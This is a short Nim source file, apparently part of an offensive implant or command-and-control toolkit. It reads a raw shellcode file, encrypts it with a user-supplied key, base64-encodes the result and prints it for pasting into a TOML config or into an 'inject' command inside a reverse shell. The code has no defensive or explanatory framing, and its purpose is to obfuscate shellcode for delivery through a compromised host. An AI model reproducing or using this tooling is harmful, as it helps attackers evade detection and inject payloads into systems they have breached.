#[
  - For converting raw shellcode files
]#

import os
import core/rc_for
from base64 import encode
from core/util import toByteSeq

when isMainModule:
  if paramCount() < 2:
    echo "Usage: ./convert <bin file> <key str>"
    quit(1)

  var binFile: string = paramStr(1)
  var key: string = paramStr(2)
  
  var shellCode: string = readFile(binFile)
  var encrypted: string = trcEnc(key, shellCode)
  var encShellCode: seq[byte] = toByteSeq(encrypted)
  var b64enc = encode(encShellCode)
  echo "[Method 1] Key: In the toml config"
  echo "           SC: In the toml config\n"
  echo "[Method 2] Key: In the toml config"
  echo "           SC: Paste with the inject command in the reverse shell\n"
  echo "[+] Copy/paste: ", b64enc

